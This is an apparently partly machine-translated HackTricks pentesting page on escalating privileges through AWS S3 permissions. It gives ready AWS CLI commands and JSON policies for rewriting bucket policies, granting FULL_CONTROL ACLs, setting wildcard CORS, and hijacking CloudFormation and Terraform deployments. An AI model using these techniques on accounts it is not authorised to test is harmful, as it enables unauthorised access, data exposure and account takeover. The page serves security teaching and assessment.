# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

拥有这些权限的攻击者在感兴趣的存储桶上可能能够劫持资源并提升权限。

例如，拥有对名为 "cf-templates-nohnwfax6a6i-us-east-1" 的 **cloudformation bucket 的这些权限** 的攻击者将能够劫持部署。可以通过以下策略授予该访问：
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
And the hijack is possible because there is a **small time window from the moment the template is uploaded** to the bucket to the moment the **template is deployed**. An attacker might just create a **lambda function** in his account that will **trigger when a bucket notification is sent**, and **hijacks** the **content** of that **bucket**.

![](<../../../images/image (174).png>)

The Pacu module [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) can be used to automate this attack.\
For mor informatino check the original research: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

这些是用于**从 S3 获取和上传对象**的权限。AWS（以及外部服务）中的若干服务使用 S3 存储来保存 **配置文件**。\
拥有 **read access** 的攻击者可能会在其中发现 **敏感信息**。\
拥有 **write access** 的攻击者可以**修改数据以滥用某些服务并尝试 escalate privileges**。\
以下是一些示例：

- 如果某个 EC2 实例将 **user data 存放在 S3 bucket** 中，攻击者可以修改它以 **execute arbitrary code inside the EC2 instance**。

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

It is very common that the [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state files are being saved to blob storage of cloud providers, e.g. AWS S3. The file suffix for a state file is `.tfstate`, and the bucket names often also give away that they contain terraform state files. Usually, every AWS account has one such bucket to store the state files that show the state of the account.
Also usually, in real world accounts almost always all developers have `s3:*` and sometimes even business users have `s3:Put*`.

So, if you have the permissions listed over these files, there is an attack vector that allows you to gain RCE in the pipeline with the privileges of `terraform` - most of the time `AdministratorAccess`, making you the admin of the cloud account. Also, you can use that vector to do a denial of service attack by making `terraform` delete legitimate resources.

Follow the description in the *Abusing Terraform State Files* section of the *Terraform Security* page for directly usable exploit code:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

攻击者需要**来自同一账号**，否则会触发错误 `The specified method is not allowed`，拥有此权限的攻击者可以为自己授予对该 bucket(s) 的更多权限，从而读取、写入、修改、删除并暴露这些 bucket。
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

攻击者可以滥用这些权限来**授予他对特定存储桶的更多访问权限**。\
注意，攻击者不需要来自同一账户。此外，写权限
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

攻击者可以滥用这些权限，授予自己对桶内特定对象的更高访问权限。
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

攻击者拥有这些权限后，应该能够将 Acl 应用到特定的对象版本上。
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
### `s3:PutBucketCORS`

拥有 s3:PutBucketCORS 权限的攻击者可以修改 bucket 的 CORS（跨源资源共享，Cross-Origin Resource Sharing）配置，该配置控制哪些网站域名可以访问其端点。如果他们设置了宽松的策略，任意网站都可以从浏览器直接向该 bucket 发起请求并读取响应。

这意味着，如果托管在该 bucket 的 web 应用的已认证用户访问了攻击者的网站，攻击者可能会利用宽松的 CORS 策略，视应用而定访问该用户的个人资料数据，甚至劫持用户账户。
```bash
aws s3api put-bucket-cors \
--bucket <BUCKET_NAME> \
--cors-configuration '{
"CORSRules": [
{
"AllowedOrigins": ["*"],
"AllowedMethods": ["GET", "PUT", "POST"],
"AllowedHeaders": ["*"],
"ExposeHeaders": ["x-amz-request-id"],
"MaxAgeSeconds": 3000
}
]
}'
```
{{#include ../../../../banners/hacktricks-training.md}}
